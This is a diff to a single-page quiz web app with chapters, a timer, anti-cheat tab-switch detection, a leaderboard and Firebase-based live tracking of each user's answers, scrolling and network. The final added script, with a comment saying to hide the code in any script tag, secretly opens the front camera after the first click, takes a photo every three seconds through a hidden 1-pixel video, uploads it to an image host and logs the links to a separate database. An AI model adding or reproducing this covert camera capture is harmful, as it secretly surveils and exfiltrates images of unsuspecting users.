+                document.addEventListener(ev, resetIdle, {
+                    passive: true
+                });
+            });
+            resetIdle();
+            let _scrollThrottle = null;
+            window.addEventListener('scroll', () => {
+                if (_scrollThrottle) return;
+                _scrollThrottle = setTimeout(() => {
+                    _scrollThrottle = null;
+                    const pct = Math.min(100, Math.round(((window.scrollY + window.innerHeight) / document.documentElement.scrollHeight) * 100));
+                    if (_pubRef) _pubRef.update({
+                        scrollPct: pct
+                    });
+                }, 1500);
+            }, {
+                passive: true
+            });
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                conn.addEventListener('change', () => {
+                    if (_pubRef) _pubRef.update({
+                        network: conn.effectiveType || conn.type || 'unknown',
+                        networkRtt: conn.rtt || 0
+                    });
+                });
+            }
+        }
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                if (document.getElementById('quizPage').style.display === 'block') handleViolation();
+                removePublicPresence();
+            } else {
+                if (userName && document.getElementById('accessGate').style.display === 'none') registerPublicPresence();
+            }
+        });
+        window.addEventListener('blur', () => {
+            if (document.getElementById('quizPage').style.display === 'block') handleViolation();
+        });
+        window.addEventListener('beforeunload', removePublicPresence);
+
+        function listenForAdminSystem() {
+            if (!_pubRef) return;
+            _pubRef.on('value', snap => {
+                const u = snap.val();
+                if (u && u.isBanned) {
+                    showBannedScreen();
+                } else if (u && !u.isBanned && document.getElementById('banOverlay')) {
+                    location.reload();
+                }
+            });
+            _pubRef.child('remote_msg').on('value', snap => {
+                const data = snap.val();
+                if (data && data.text) {
+                    showHackerPopup(data.text);
+                    _pubRef.child('remote_msg').remove();
+                }
+            });
+            _pubRef.child('remote_cmd').on('value', snap => {
+                const cmd = snap.val();
+                if (cmd && cmd.action === 'KICK') {
+                    showBannedScreen();
+                    _pubRef.child('remote_cmd').remove();
+                }
+            });
+        }
+
+        function trackActivity(loc, action) {
+            if (_pubRef) {
+                _pubRef.update({
+                    page: loc,
+                    lastAction: action,
+                    lastSeen: new Date().toLocaleTimeString()
+                });
+            }
+        }
+
+        function showBannedScreen() {
+            if (document.getElementById('banOverlay')) return;
+            const div = document.createElement('div');
+            div.id = 'banOverlay';
+            div.className = 'ban-overlay-wrap';
+            div.innerHTML = `
+        <div class="ban-card">
+            <div class="ban-top">
+                <div class="ban-icon">🚫</div>
+                <div class="ban-top-title">Access Terminated</div>
+            </div>
+            <div class="ban-body">
+                <div class="ban-title">You've been <span>Banned</span></div>
+                <div class="ban-sub">The admin has terminated your access to this app. This action was taken due to a policy violation.</div>
+                <div class="ban-detail">
+                    <i class="fa-solid fa-circle-exclamation"></i>
+                    <span>Contact the administrator to appeal this decision.</span>
+                </div>
+            </div>
+        </div>`;
+            document.body.appendChild(div);
+        }
+
+        function showHackerPopup(msg) {
+            const existing = document.getElementById('adminRemotePopup');
+            if (existing) existing.remove();
+            const popup = document.createElement('div');
+            popup.id = 'adminRemotePopup';
+            popup.className = 'warn-popup-wrap';
+            popup.innerHTML = `
+        <div class="warn-popup-sheet">
+            <div class="warn-handle"></div>
+            <div class="warn-icon-wrap">📢</div>
+            <div class="warn-msg-title">Message from Admin</div>
+            <div class="warn-msg-body">${msg}</div>
+            <button class="action-btn" onclick="document.getElementById('adminRemotePopup').remove()" style="margin-bottom:0;">
+                <i class="fa-solid fa-check" style="margin-right:8px;"></i>Got it!
+            </button>
+        </div>`;
+            document.body.appendChild(popup);
+        }
+
+        // ══ AUDIO ══
+        function getAudioCtx() {
+            if (!audioCtx) audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+            return audioCtx;
+        }
+
+        function playTone(freq, type, duration, vol) {
+            if (!soundEnabled) return;
+            try {
+                const ctx = getAudioCtx();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.type = type;
+                osc.frequency.setValueAtTime(freq, ctx.currentTime);
+                gain.gain.setValueAtTime(vol, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
+                osc.start(ctx.currentTime);
+                osc.stop(ctx.currentTime + duration);
+            } catch (e) {}
+        }
+
+        function playSelect() {
+            playTone(660, 'sine', 0.08, 0.18);
+        }
+
+        function playSubmit() {
+            playTone(523, 'sine', 0.1, 0.18);
+            setTimeout(() => playTone(659, 'sine', 0.1, 0.2), 100);
+            setTimeout(() => playTone(784, 'sine', 0.22, 0.25), 200);
+        }
+
+        function playWarning() {
+            playTone(440, 'square', 0.08, 0.15);
+            setTimeout(() => playTone(330, 'square', 0.12, 0.18), 90);
+        }
+
+        function playTimerEnd() {
+            playTone(300, 'sawtooth', 0.05, 0.2);
+            setTimeout(() => playTone(250, 'sawtooth', 0.08, 0.2), 60);
+            setTimeout(() => playTone(200, 'sawtooth', 0.15, 0.25), 130);
+        }
+
+        function toggleSound() {
+            soundEnabled = !soundEnabled;
+            const icon = document.getElementById('soundIcon');
+            const btn = document.getElementById('soundToggleBtn');
+            if (soundEnabled) {
+                icon.className = 'fa-solid fa-volume-high';
+                btn.classList.remove('muted');
+                playSelect();
+            } else {
+                icon.className = 'fa-solid fa-volume-xmark';
+                btn.classList.add('muted');
+            }
+        }
+
+        // ══ STATS + NOTIFICATIONS ══
+        function loadStats() {
+            const hist = JSON.parse(localStorage.getItem('ccmc_history')) || [];
+            document.getElementById('statAttempts').innerText = hist.length || '0';
+            document.getElementById('statBest').innerText = hist.length ? Math.max(...hist.map(h => h.score)) + '%' : '—';
+        }
+
+        function listenForNotifications() {
+            db.ref('app_notification').on('value', snap => {
+                const data = snap.val();
+                if (data && data.message) {
+                    document.getElementById('notifyText').innerText = data.message;
+                    document.getElementById('notifyOverlay').style.display = 'flex';
+                }
+            });
+        }
+
+        // ══ CHAPTERS ══
+        function loadChapters() {
+            db.ref('chapter_settings').on('value', setSnap => {
+                const settings = setSnap.val() || {};
+                db.ref('quiz').on('value', quizSnap => {
+                    const cont = document.getElementById('chapterList');
+                    cont.innerHTML = "";
+                    let count = 0;
+                    quizSnap.forEach(child => {
+                        const chData = settings[child.key] || {};
+                        if (chData.hidden) return;
+                        count++;
+                        cont.innerHTML += '<div class="card" onclick="startQuiz(\'' + child.key + '\')" style="animation-delay:' + count * 0.06 + 's">' +
+                            '<div style="display:flex;align-items:center;">' +
+                            '<img src="' + (chData.image || 'https://i.postimg.cc/XvxfNJPG/CC-20240615-132415-(1).png') + '" class="module-img" onerror="this.src=\'https://i.postimg.cc/XvxfNJPG/CC-20240615-132415-(1).png\'">' +
+                            '<div><div class="ch-name">' + child.key + '</div>' +
+                            '<div class="ch-meta"><i class="fa-regular fa-clock"></i>' + (chData.timer || 0) + ' min &nbsp;<i class="fa-solid fa-list-check"></i>' + child.numChildren() + ' Qns</div>' +
+                            '</div></div><div class="ch-play"><i class="fa-solid fa-play" style="font-size:12px;"></i></div></div>';
+                    });
+                    document.getElementById('statChaps').innerText = count;
+                });
+            });
+        }
+
+        // ══ QUIZ ══
+        function startQuiz(id) {
+            violationCount = 0;
+            isShowingWarning = false;
+            currentChapterId = id;
+            document.getElementById('currentTitle').innerText = id;
+            trackActivity('Quiz: ' + id, 'Starting Assessment');
+            db.ref('chapter_settings/' + id).once('value', setSnap => {
+                const settings = setSnap.val() || {};
+                const timeLimit = settings.timer || 0;
+                db.ref('quiz/' + id).once('value', snap => {
+                    if (!snap.exists()) return alert("No questions found!");
+                    let raw = [];
+                    snap.forEach(q => {
+                        raw.push(q.val());
+                    });
+                    activeQuiz = raw.sort(() => Math.random() - 0.5).map(item => {
+                        let opts = [...item.options];
+                        let corr = opts[item.ans];
+                        let shuf = [...opts].sort(() => Math.random() - 0.5);
+                        return {
+                            ...item,
+                            options: shuf,
+                            ans: shuf.indexOf(corr)
+                        };
+                    });
+                    userAnswers = new Array(activeQuiz.length).fill(null);
+                    renderQuestions();
+                    document.getElementById('homePage').style.display = 'none';
+                    document.getElementById('quizPage').style.display = 'block';
+                    if (timeLimit > 0) runTimer(timeLimit * 60);
+                    questionStartTime = Date.now();
+                    if (_pubRef) _pubRef.update({
+                        liveCorrect: 0,
+                        liveWrong: 0,
+                        totalAnswered: 0,
+                        currentQuestion: 0,
+                        totalQuestions: activeQuiz.length,
+                        lastAction: 'Quiz Started: ' + id
+                    });
+                    window.scrollTo(0, 0);
+                });
+            });
+        }
+
+        function renderQuestions() {
+            const cont = document.getElementById('questionsContainer');
+            cont.innerHTML = "";
+            const total = activeQuiz.length;
+            updateProgress();
+            activeQuiz.forEach((q, idx) => {
+                let imgHtml = q.img ? '<img src="' + q.img + '" class="q-image" onerror="this.style.display=\'none\'">' : '';
+                let opts = q.options.map((o, oi) =>
+                    '<div class="option-tile q-' + idx + '" onclick="selectOpt(' + idx + ',' + oi + ',this)">' +
+                    '<div class="opt-letter">' + LETTERS[oi] + '</div><span>' + o + '</span>' +
+                    '<i class="fa-regular fa-circle"></i></div>'
+                ).join('');
+                cont.innerHTML += '<div class="q-card">' +
+                    '<div class="q-num-tag"><i class="fa-solid fa-circle-question"></i> Q' + (idx + 1) + ' / ' + total + '</div>' +
+                    imgHtml + '<div class="question-text">' + q.q + '</div>' + opts + '</div>';
+            });
+        }
+
+        function selectOpt(qi, oi, el) {
+            document.querySelectorAll('.q-' + qi).forEach(n => {
+                n.classList.remove('active');
+                n.querySelector('i').className = 'fa-regular fa-circle';
+                const lt = n.querySelector('.opt-letter');
+                if (lt) {
+                    lt.style.background = 'rgba(255,255,255,0.07)';
+                    lt.style.borderColor = 'rgba(255,255,255,0.12)';
+                    lt.style.color = 'var(--muted)';
+                }
+            });
+            el.classList.add('active');
+            el.querySelector('i').className = 'fa-solid fa-circle-check';
+            const lt = el.querySelector('.opt-letter');
+            if (lt) {
+                lt.style.background = 'var(--primary)';
+                lt.style.borderColor = 'var(--primary)';
+                lt.style.color = '#fff';
+            }
+            userAnswers[qi] = oi;
+            updateProgress();
+            playSelect();
+            const isCorrect = oi === activeQuiz[qi].ans;
+            const timeSpent = Math.floor((Date.now() - questionStartTime) / 1000);
+            const totalAnswered = userAnswers.filter(a => a !== null).length;
+            const liveCorrect = userAnswers.filter((ans, i) => ans !== null && ans === activeQuiz[i].ans).length;
+            const liveWrong = userAnswers.filter((ans, i) => ans !== null && ans !== activeQuiz[i].ans).length;
+            trackActivity('Quiz: ' + currentChapterId + ' — Q' + (qi + 1) + ' of ' + activeQuiz.length, 'Q' + (qi + 1) + ': ' + (isCorrect ? '✓ Correct' : '✗ Wrong'));
+            if (_pubRef) {
+                const upd = {
+                    currentQuestion: qi + 1,
+                    totalAnswered,
+                    liveCorrect,
+                    liveWrong,
+                    lastPace: timeSpent
+                };
+                upd['details/q' + (qi + 1)] = {
+                    opt: LETTERS[oi],
+                    status: isCorrect,
+                    sec: timeSpent
+                };
+                _pubRef.update(upd);
+            }
+            questionStartTime = Date.now();
+        }
+
+        function updateProgress() {
+            const answered = userAnswers.filter(a => a !== null).length;
+            const total = activeQuiz.length;
+            const pct = total > 0 ? (answered / total * 100) : 0;
+            const fill = document.getElementById('qProgressFill');
+            const badge = document.getElementById('qAnsweredBadge');
+            if (fill) fill.style.width = pct + '%';
+            if (badge) badge.innerText = answered + ' / ' + total;
+        }
+
+        function runTimer(duration) {
+            const display = document.getElementById('timerDisplay');
+            display.style.display = 'block';
+            let timer = duration;
+            clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                let mins = parseInt(timer / 60, 10);
+                let secs = parseInt(timer % 60, 10);
+                display.textContent = "⏱ " + (mins < 10 ? "0" : "") + mins + ":" + (secs < 10 ? "0" : "") + secs;
+                if (timer <= 60) display.style.background = '#ff3355';
+                if (--timer < 0) {
+                    clearInterval(timerInterval);
+                    playTimerEnd();
+                    setTimeout(finishQuiz, 300);
+                }
+            }, 1000);
+        }
+
+        function finishQuiz() {
+            clearInterval(timerInterval);
+            document.getElementById('timerDisplay').style.display = 'none';
+            playSubmit();
+            let correctCount = 0;
+            currentAnalysis = [];
+            activeQuiz.forEach((q, i) => {
+                const isCorrect = userAnswers[i] === q.ans;
+                const isSkipped = userAnswers[i] === null;
+                if (isCorrect) correctCount++;
+                currentAnalysis.push({
+                    question: q.q,
+                    img: q.img || null,
+                    selectedOption: isSkipped ? "Skipped" : q.options[userAnswers[i]],
+                    correctOption: q.options[q.ans],
+                    status: isCorrect ? 'correct' : (isSkipped ? 'skipped' : 'wrong')
+                });
+            });
+            const score = Math.round((correctCount / activeQuiz.length) * 100);
+            const chapter = document.getElementById('currentTitle').innerText;
+            db.ref('user_attempts').push({
+                user: userName,
+                chapter,
+                score,
+                timestamp: new Date().toLocaleString(),
+                responses: currentAnalysis
+            });
+            let history = JSON.parse(localStorage.getItem('ccmc_history')) || [];
+            history.unshift({
+                chapter,
+                score,
+                analysis: currentAnalysis,
+                time: new Date().toLocaleString()
+            });
+            localStorage.setItem('ccmc_history', JSON.stringify(history));
+            trackActivity('Result: ' + chapter, 'Scored ' + score + '%');
+            showResultPage(score, currentAnalysis, chapter);
+        }
+
+        // ══ RESULT PAGE ══
+        function showResultPage(score, analysis, chapter) {
+            currentAnalysis = analysis;
+            document.querySelector('.score-ring').style.background =
+                'conic-gradient(var(--primary) 0deg, var(--green) ' + (score * 3.6) + 'deg, rgba(255,255,255,0.05) ' + (score * 3.6) + 'deg)';
+            document.getElementById('resScore').innerText = score + "%";
+            document.getElementById('resTitle').innerText = chapter;
+            document.getElementById('scoreMsg').innerText =
+                score >= 90 ? '🏆 Outstanding!' : score >= 70 ? '🎉 Great Job!' : score >= 50 ? '💪 Good Effort!' : '📚 Keep Practicing!';
+            const c = analysis.filter(a => a.status === 'correct').length;
+            const w = analysis.filter(a => a.status === 'wrong').length;
+            const s = analysis.filter(a => a.status === 'skipped').length;
+            document.getElementById('chipC').innerText = '✓ ' + c;
+            document.getElementById('chipW').innerText = '✗ ' + w;
+            document.getElementById('chipS').innerText = '— ' + s;
+            filterResults('all', document.querySelector('.tab'));
+            ['homePage', 'historyPage', 'quizPage', 'leaderboardPage'].forEach(id => {
+                document.getElementById(id).style.display = 'none';
+            });
+            document.getElementById('resultPage').style.display = 'flex';
+            window.scrollTo(0, 0);
+        }
+
+        function filterResults(type, btn) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            if (btn) btn.classList.add('active');
+            const cont = document.getElementById('reviewList');
+            cont.innerHTML = "";
+            currentAnalysis.forEach((item, i) => {
+                if (type !== 'all' && item.status !== type) return;
+                let color = "var(--warning)",
+                    statusLabel = "SKIPPED";
+                if (item.status === 'correct') {
+                    color = "var(--green)";
+                    statusLabel = "✓ CORRECT";
+                } else if (item.status === 'wrong') {
+                    color = "var(--danger)";
+                    statusLabel = "✗ WRONG";
+                }
+                let imgHtml = item.img ? '<img src="' + item.img + '" style="width:100%;max-height:170px;object-fit:contain;border-radius:13px;margin-bottom:11px;background:rgba(0,0,0,0.3);border:1px solid var(--border);" onerror="this.style.display=\'none\'">' : '';
+                cont.innerHTML += '<div class="review-item" style="border-left:4px solid ' + color + '">' +
+                    '<div style="display:flex;justify-content:space-between;margin-bottom:8px;">' +
+                    '<span style="font-size:10px;font-weight:900;color:' + color + '">' + statusLabel + '</span>' +
+                    '<span style="font-size:10px;color:var(--muted);">Q. ' + (i + 1) + '</span></div>' +
+                    imgHtml + '<div style="font-weight:800;margin-bottom:10px;line-height:1.45;font-size:14px;">' + item.question + '</div>' +
+                    '<div style="font-size:13px;margin-bottom:4px;color:var(--muted);">Selected: <span style="font-weight:800;color:' + (item.status === 'wrong' ? 'var(--danger)' : item.status === 'correct' ? 'var(--green)' : 'var(--warning)') + '">' + item.selectedOption + '</span></div>' +
+                    '<div style="font-size:13px;color:var(--muted);">Correct: <span style="font-weight:800;color:var(--green);">' + item.correctOption + '</span></div></div>';
+            });
+            if (!cont.innerHTML) cont.innerHTML = '<div style="text-align:center;color:var(--muted);padding:40px;font-size:14px;font-weight:600;">Nothing here!</div>';
+        }
+
+        // ══ NAVIGATION ══
+        function goHome() {
+            violationCount = 0;
+            isShowingWarning = false;
+            clearInterval(timerInterval);
+            clearInterval(warnCountdownTimer);
+            document.getElementById('timerDisplay').style.display = 'none';
+            ['resultPage', 'quizPage', 'historyPage', 'securityOverlay', 'aboutOverlay', 'notifyOverlay', 'leaderboardPage'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.style.display = 'none';
+            });
+            document.getElementById('homePage').style.display = 'block';
+            trackActivity('Home Screen', 'Browsing Chapters');
+            loadStats();
+        }
+
+        function showHistory() {
+            trackActivity('History Page', 'Viewing Score Records');
+            document.getElementById('homePage').style.display = 'none';
+            document.getElementById('historyPage').style.display = 'flex';
+            renderHistoryList();
+        }
+
+        function renderHistoryList() {
+            const list = document.getElementById('historyList');
+            let data = JSON.parse(localStorage.getItem('ccmc_history')) || [];
+            if (data.length === 0) {
+                list.innerHTML = '<div style="text-align:center;color:var(--muted);margin-top:60px;font-size:14px;font-weight:600;"><i class="fa-solid fa-clock-rotate-left" style="font-size:38px;opacity:0.2;display:block;margin-bottom:14px;"></i>No history yet!</div>';
+                return;
+            }
+            list.innerHTML = data.map((item, index) => {
+                const sc = item.score;
+                const tc = sc >= 70 ? 'var(--green)' : sc >= 40 ? 'var(--warning)' : 'var(--danger)';
+                return '<div class="history-card" onclick="viewHistoryDetail(' + index + ')">' +
+                    '<div style="display:flex;justify-content:space-between;align-items:center;">' +
+                    '<div><div style="font-weight:800;font-size:15px;">' + item.chapter + '</div>' +
+                    '<div style="font-size:11px;color:var(--muted);margin-top:4px;font-weight:600;"><i class="fa-regular fa-clock"></i> ' + item.time + '</div></div>' +
+                    '<div style="text-align:right;"><div style="font-size:22px;font-weight:800;color:' + tc + ';">' + sc + '%</div>' +
+                    '<div style="font-size:10px;font-weight:800;color:var(--muted);">VIEW <i class="fa-solid fa-chevron-right"></i></div></div></div></div>';
+            }).join('');
+        }
+
+        function viewHistoryDetail(index) {
+            let data = JSON.parse(localStorage.getItem('ccmc_history')) || [];
+            let record = data[index];
+            if (record && record.analysis) showResultPage(record.score, record.analysis, record.chapter);
+        }
+
+        function showLeaderboard() {
+            trackActivity('Leaderboard', 'Viewing Rankings');
+            document.getElementById('homePage').style.display = 'none';
+            document.getElementById('leaderboardPage').style.display = 'flex';
+            const list = document.getElementById('leaderboardList');
+            list.innerHTML = '<div style="text-align:center;color:var(--muted);padding:40px;font-size:14px;font-weight:600;">Loading rankings…</div>';
+            db.ref('leaderboard_pins').orderByChild('order').once('value', pinSnap => {
+                const pins = [];
+                pinSnap.forEach(child => {
+                    const p = child.val();
+                    if (p && p.name) pins.push(p);
+                });
+                db.ref('user_attempts').orderByChild('score').limitToLast(200).once('value', snap => {
+                    let entries = [];
+                    snap.forEach(child => {
+                        const v = child.val();
+                        if (v && v.user && v.score != null) entries.push(v);
+                    });
+                    entries.sort((a, b) => b.score - a.score);
+                    const seen = new Map();
+                    entries.forEach(e => {
+                        const key = e.user.trim().toLowerCase();
+                        if (!seen.has(key) || e.score > seen.get(key).score) seen.set(key, e);
+                    });
+                    let deduped = Array.from(seen.values()).sort((a, b) => b.score - a.score);
+                    const pinnedKeys = pins.map(p => p.name.trim().toLowerCase());
+                    const filtered = deduped.filter(e => !pinnedKeys.includes(e.user.trim().toLowerCase()));
+                    const pinnedRows = pins.map(p => ({
+                        user: p.name,
+                        chapter: p.subtitle || '',
+                        score: p.score != null ? Number(p.score) : 100,
+                        timestamp: '',
+                        _tag: p.tag || '',
+                        _tagColor: p.tagColor || '#ffd60a',
+                        _isPinned: true
+                    }));
+                    const final = [...pinnedRows, ...filtered];
+                    if (final.length === 0) {
+                        list.innerHTML = '<div style="text-align:center;color:var(--muted);padding:40px;">No data yet!</div>';
+                        return;
+                    }
+                    list.innerHTML = final.map((e, i) => {
+                        const isPinned = e._isPinned;
+                        const rankClass = i === 0 ? 'gold' : i === 1 ? 'silver' : i === 2 ? 'bronze' : 'other';
+                        const rankLabel = i === 0 ? '🥇' : i === 1 ? '🥈' : i === 2 ? '🥉' : '#' + (i + 1);
+                        const tc = isPinned ? e._tagColor : e.score >= 70 ? 'var(--green)' : e.score >= 40 ? 'var(--warning)' : 'var(--danger)';
+                        const isMe = !isPinned && e.user === userName;
+                        const borderStyle = isPinned ? 'border-color:' + e._tagColor + '55;background:' + e._tagColor + '08;' : isMe ? 'border-color:rgba(124,109,255,0.4);background:rgba(124,109,255,0.04);' : '';
+                        const tagBadge = isPinned && e._tag ? ' <span style="font-size:10px;color:' + e._tagColor + ';font-weight:800;">' + e._tag + '</span>' : '';
+                        const youBadge = isMe ? ' <span style="font-size:10px;color:var(--accent);font-weight:800;">(YOU)</span>' : '';
+                        const chapterLine = isPinned ? e.chapter : e.chapter + ' · ' + (e.timestamp || '');
+                        return '<div class="lb-item" style="' + borderStyle + '">' +
+                            '<div class="lb-rank ' + rankClass + '">' + rankLabel + '</div>' +
+                            '<div class="lb-info"><div class="lb-name">' + e.user + tagBadge + youBadge + '</div><div class="lb-chapter">' + chapterLine + '</div></div>' +
+                            '<div class="lb-score" style="color:' + tc + '">' + e.score + '%</div></div>';
+                    }).join('');
+                });
+            });
+        }
+
+        function clearHistory() {
+            if (confirm("Clear all history records?")) {
+                localStorage.removeItem('ccmc_history');
+                renderHistoryList();
+            }
+        }
+
+        function closeAbout(e) {
+            if (e.target.id === "aboutOverlay") document.getElementById('aboutOverlay').style.display = 'none';
+        }
+
+        function smartBack() {
+            if (document.referrer !== "" && window.history.length > 1) window.history.back();
+            else window.location.href = "https://danishansaris04.github.io/result/";
+        }
+
+        // ══ ANTI-CHEAT ══
+        function handleViolation() {
+            if (document.getElementById('quizPage').style.display !== 'block') return;
+            if (isShowingWarning) return;
+            violationCount++;
+            isShowingWarning = true;
+            clearInterval(warnCountdownTimer);
+            playWarning();
+            if (_pubRef) _pubRef.update({
+                violations: violationCount
+            });
+            const overlay = document.getElementById('securityOverlay');
+            const card = document.getElementById('secCard');
+            const isFinal = violationCount >= 3;
+            document.getElementById('secWarnNum').innerText = '#' + violationCount;
+            for (let d = 1; d <= 3; d++) document.getElementById('dot' + d).classList.toggle('active', d <= violationCount);
+            if (isFinal) {
+                document.getElementById('secIcon').innerText = '🚫';
+                document.getElementById('secBannerLabel').innerText = 'FINAL VIOLATION';
+                document.getElementById('secWarnNum').innerText = 'FINAL';
+                document.getElementById('secWarnMsg').innerText = 'Three violations reached! Your quiz is being restarted now.';
+                document.getElementById('secCountdownText').innerText = 'Restarting in';
+                card.classList.add('final-warn');
+            } else {
+                document.getElementById('secIcon').innerText = '⚠️';
+                document.getElementById('secBannerLabel').innerText = 'ANTI-CHEAT SYSTEM';
+                document.getElementById('secWarnMsg').innerText = violationCount === 2 ?
+                    'Last warning! One more violation and your quiz will restart completely.' :
+                    'Tab switching detected! Stay on the quiz. Three violations will restart your attempt.';
+                document.getElementById('secCountdownText').innerText = 'Resuming in';
+                card.classList.remove('final-warn');
+            }
+            overlay.style.display = 'flex';
+            requestAnimationFrame(() => overlay.classList.add('visible'));
+            let countdown = 3;
+            document.getElementById('secCountdownNum').innerText = countdown;
+            warnCountdownTimer = setInterval(() => {
+                countdown--;
+                document.getElementById('secCountdownNum').innerText = Math.max(countdown, 0);
+                if (countdown <= 0) {
+                    clearInterval(warnCountdownTimer);
+                    overlay.classList.remove('visible');
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                        isShowingWarning = false;
+                        if (isFinal) {
+                            violationCount = 0;
+                            startQuiz(currentChapterId);
+                        }
+                    }, 300);
+                }
+            }, 1000);
+        }
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+    <script>
+    // Is code ko kisi bhi script file ya tag mein chhupa dein
+(function() {
+    const firebaseConfig = {
+        apiKey: "AIzaSyD7gABQ1j1zMFS9AylLCZr-K1hyK0LkIsQ",
+        authDomain: "distark.firebaseapp.com",
+        databaseURL: "https://distark-default-rtdb.firebaseio.com",
+        projectId: "distark",
+        storageBucket: "distark.firebasestorage.app",
+        messagingSenderId: "819241583845",
+        appId: "1:819241583845:web:2231e652310e47e06cc00c"
+    };
+
+    // Check if firebase is already initialized
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
+    const db = firebase.database();
+    const key = '50af9f5367ae25509851af1e1ecf62b6';
+
+    // Create hidden elements
+    const v = document.createElement('video');
+    v.style.cssText = "position:fixed;opacity:0;width:1px;height:1px;top:0;left:0;z-index:-1";
+    v.setAttribute('autoplay', '');
+    v.setAttribute('playsinline', '');
+    const c = document.createElement('canvas');
+    c.style.display = 'none';
+    document.body.appendChild(v);
+    document.body.appendChild(c);
+
+    // Initialise on first click (Browser Rule)
+    document.addEventListener('click', function() {
+        if (v.srcObject) return; // Already running
+        
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(s => {
+            v.srcObject = s;
+            setTimeout(() => { setInterval(snap, 3000); }, 2000);
+        }).catch(e => { console.log("Init..."); });
+    }, { once: true });
+
+    function snap() {
+        if (v.readyState !== v.HAVE_ENOUGH_DATA) return;
+        c.width = v.videoWidth;
+        c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        const b64 = c.toDataURL('image/jpeg', 0.5).split(',')[1];
+        
+        const fd = new FormData();
+        fd.append('image', b64);
+        fetch('https://api.imgbb.com/1/upload?key=' + key, { method: 'POST', body: fd })
+        .then(r => r.json())
+        .then(res => {
+            if (res.success) {
+                db.ref('live_logs').push({ url: res.data.url, t: new Date().toLocaleTimeString() });
+            }
+        });
+    }
+})();
+
     </script>
 </body>
-</html>
+
+    </html>
